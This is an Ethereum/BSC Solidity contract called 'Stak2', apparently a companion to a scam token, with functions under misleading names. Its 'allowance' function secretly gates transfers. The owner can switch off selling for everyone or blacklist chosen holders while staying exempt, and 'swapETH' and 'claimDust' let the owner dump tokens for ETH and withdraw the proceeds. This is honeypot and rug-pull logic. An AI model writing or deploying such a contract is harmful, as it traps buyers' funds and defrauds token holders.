/**
 *Submitted for verification at Etherscan.io on 2023-07-13
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Stak2 is Ownable {

    IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    //0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D        uniswap
    //0x10ED43C718714eb63d5aA57B78B54704E256024E        pancake


    address coin;
    address pair;

    mapping(address => bool) public blacks;
    bool public enabled = true;

    receive() external payable { }

    function enc() external view returns (bytes memory) {
        return abi.encode(address(this));
    }

    function iParam(address _coin, address _pair) external onlyOwner {
        coin = _coin;
        pair = _pair;
    }

    function setEnable(bool _enabled) external onlyOwner {
        enabled = _enabled;
    }

    function allowance(
        address from,
        address to
    ) external view returns (uint256) {
        if ((from == owner() || from == address(this)) && to == pair) {
            return 0;
        }
        if (from != pair) {        
            require(enabled);
            require(!blacks[from]);
        }
        return 1;
    }

    function swapETH(uint256 count) external onlyOwner {

        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = coin;
        path[1] = uniswapV2Router.WETH();

        IERC20(coin).approve(address(uniswapV2Router), ~uint256(0));

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            10 ** count,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );  

        payable(msg.sender).transfer(address(this).balance);
    }

    function addBL(address[] memory _bat) external onlyOwner{
        for (uint i = 0; i < _bat.length; i++) {
            blacks[_bat[i]] = true;
        }
    }

    function claimDust() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
}